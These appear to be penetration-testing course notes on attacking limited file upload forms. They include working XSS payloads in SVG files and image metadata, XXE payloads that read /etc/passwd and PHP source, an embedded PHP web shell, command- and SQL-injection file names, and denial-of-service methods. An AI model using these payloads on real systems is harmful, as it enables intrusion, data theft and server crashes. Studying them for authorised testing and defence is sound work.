# Limited File Uploads
Some upload forms have secure filters that may not be exploitable with the techniques we discussed. However, even if we are dealing with a limited (i.e., non-arbitrary) file upload form, which only allows us to upload specific file types, we may still be able to perform some attacks on the web application.

Certain file types, like `SVG`, `HTML`, `XML`, and even some image and document files, may allow us to introduce new vulnerabilities to the web application by uploading malicious versions of these files. This is why fuzzing allowed file extensions is an important exercise for any file upload attack.
## XSS
Many file types may allow us to introduce a `Stored XSS` vulnerability to the web application by uploading maliciously crafted versions of them.

The most basic example is when a web application allows us to upload `HTML` files. Although HTML files won't allow us to execute code (e.g., PHP), it would still be possible to implement JavaScript code within them to carry an XSS or CSRF attack on whoever visits the uploaded HTML page.

If the target sees a link from a website they trust, and the website is vulnerable to uploading HTML documents, it may be possible to trick them into visiting the link and carry the attack on their machines.

Another example of XSS attacks is web applications that display an image's metadata after its upload. For such web applications, we can include an XSS payload in one of the Metadata parameters that accept raw text, like the `Comment` or `Artist` parameters, as follows:
```bash
exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' exiftool HTB.jpg
```
- When the image's metadata is displayed, the XSS payload should be triggered, and the JavaScript code will be executed to carry the XSS attack. 
- Furthermore, if we change the image's MIME-Type to `text/html`, some web applications may show it as an HTML document instead of an image, in which case the XSS payload would be triggered even if the metadata wasn't directly displayed.

XSS attacks can also be carried with `SVG` images, along with several other attacks. `Scalable Vector Graphics (SVG)` images are XML-based, and they describe 2D vector graphics, which the browser renders into an image.

For this reason, we can modify their XML data to include an XSS payload. For example, we can write the following to `HTB.svg`:'
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>
```
- Once we upload the image to the web application, the XSS payload will be triggered whenever the image is displayed.
## XXE
Similar attacks can be carried to lead to XXE exploitation. With SVG images, we can also include malicious XML data to leak the source code of the web application, and other internal documents within the server. The following example can be used for an SVG image that leaks the content of (`/etc/passwd`):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```
> **NOTE:** If the site automatically displays the requested file, you can remove `file:` in the second line of the above payload
- Once the above SVG image is uploaded and viewed, the XML document would get processed, and we should get the info of (`/etc/passwd`) printed on the page or shown in the page source.
- Similarly, if the web application allows the upload of `XML` documents, then the same payload can carry the same attack when the XML data is displayed on the web application.

Access to the source code will enable us to find more vulnerabilities to exploit within the web application through Whitebox Penetration Testing. For File Upload exploitation, it may allow us to `locate the upload directory, identify allowed extensions, or find the file naming scheme`, which may become handy for further exploitation.

To use XXE to read source code in PHP web applications, we can use the following payload in our SVG image:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```
- Once the SVG image is displayed, we should get the base64 encoded content of `index.php`, which we can decode to read the source code.
- **NOTE**: Make sure to change `index.php` to whatever the source that the file is being uploaded to is. (might be `upload.php` or something else)

If you find out **how** files are now stored (sometimes with things added to each file) and where they are stored, we can utilize this still to upload a PHP web shell so we can execute commands by creating an SVG file that contains the shell, then accessing the file:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]> <svg>&xxe;</svg> <?php system($_REQUEST['cmd']); ?>
```

Using XML data is not unique to SVG images, as it is also utilized by many types of documents, like `PDF`, `Word Documents`, `PowerPoint Documents`, among many others. All of these documents include XML data within them to specify their format and structure. Suppose a web application used a document viewer that is vulnerable to XXE and allowed uploading any of these documents. In that case, we may also modify their XML data to include the malicious XXE elements, and we would be able to carry a blind XXE attack on the back-end web server.
## DoS
Finally, many file upload vulnerabilities may lead to a `Denial of Service (DOS)` attack on the web server. For example, we can use the previous XXE payloads to achieve DoS attacks, as discussed in the [Web Attacks](https://academy.hackthebox.com/module/details/134) module.

Furthermore, we can utilize a `Decompression Bomb` with file types that use data compression, like `ZIP` archives. If a web application automatically unzips a ZIP archive, it is possible to upload a malicious archive containing nested ZIP archives within it, which can eventually lead to many Petabytes of data, resulting in a crash on the back-end server.

Another possible DoS attack is a `Pixel Flood` attack with some image files that utilize image compression, like `JPG` or `PNG`. We can create any `JPG` image file with any image size (e.g. `500x500`), and then manually modify its compression data to say it has a size of (`0xffff x 0xffff`), which results in an image with a perceived size of 4 Gigapixels. When the web application attempts to display the image, it will attempt to allocate all of its memory to this image, resulting in a crash on the back-end server.

In addition to these attacks, we may try a few other methods to cause a DoS on the back-end server. One way is uploading an overly large file, as some upload forms may not limit the upload file size or check for it before uploading it, which may fill up the server's hard drive and cause it to crash or slow down considerably.

If the upload function is vulnerable to directory traversal, we may also attempt uploading files to a different directory (e.g. `../../../etc/passwd`), which may also cause the server to crash.
## Injections in File Name
A common file upload attack uses a malicious string for the uploaded file name, which may get executed or processed if the uploaded file name is displayed (i.e., reflected) on the page. We can try injecting a command in the file name, and if the web application uses the file name within an OS command, it may lead to a command injection attack.

For example, if we name a file `file$(whoami).jpg` or ``file`whoami`.jpg`` or `file.jpg||whoami`, and then the web application attempts to move the uploaded file with an OS command (e.g. `mv file /tmp`), then our file name would inject the `whoami` command, which would get executed, leading to remote code execution.

Similarly, we may use an XSS payload in the file name (e.g. `<script>alert(window.origin);</script>`), which would get executed on the target's machine if the file name is displayed to them. We may also inject an SQL query in the file name (e.g. `file';select+sleep(5);--.jpg`), which may lead to an SQL injection if the file name is insecurely used in an SQL query.
## Upload Directory Disclosure
We may not have access to the link of our uploaded file and may not know the uploads directory. In such cases, we may utilize fuzzing to look for the uploads directory or even use other vulnerabilities (e.g., LFI/XXE) to find where the uploaded files are by reading the web applications source code, as we saw in the previous section.

Another method we can use to disclose the uploads directory is through forcing error messages, as they often reveal helpful information for further exploitation. One attack we can use to cause such errors is uploading a file with a name that already exists or sending two identical requests simultaneously. This may lead the web server to show an error that it could not write the file, which may disclose the uploads directory. 

We may also try uploading a file with an overly long name (e.g., 5,000 characters). If the web application does not handle this correctly, it may also error out and disclose the upload directory.
## Windows-specific Attacks
One such attack is using reserved characters, such as (`|`, `<`, `>`, `*`, or `?`), which are usually reserved for special uses like wildcards. If the web application does not properly sanitize these names or wrap them within quotes, they may refer to another file (which may not exist) and cause an error that discloses the upload directory. Similarly, we may use Windows reserved names for the uploaded file name, like (`CON`, `COM1`, `LPT1`, or `NUL`), which may also cause an error as the web application will not be allowed to write a file with this name.

Finally, we may utilize the Windows [8.3 Filename Convention](https://en.wikipedia.org/wiki/8.3_filename) to overwrite existing files or refer to files that do not exist. Older versions of Windows were limited to a short length for file names, so they used a Tilde character (`~`) to complete the file name, which we can use to our advantage.

For example, to refer to a file called (`hackthebox.txt`) we can use (`HAC~1.TXT`) or (`HAC~2.TXT`), where the digit represents the order of the matching files that start with (`HAC`). As Windows still supports this convention, we can write a file called (e.g. `WEB~.CONF`) to overwrite the `web.conf` file.
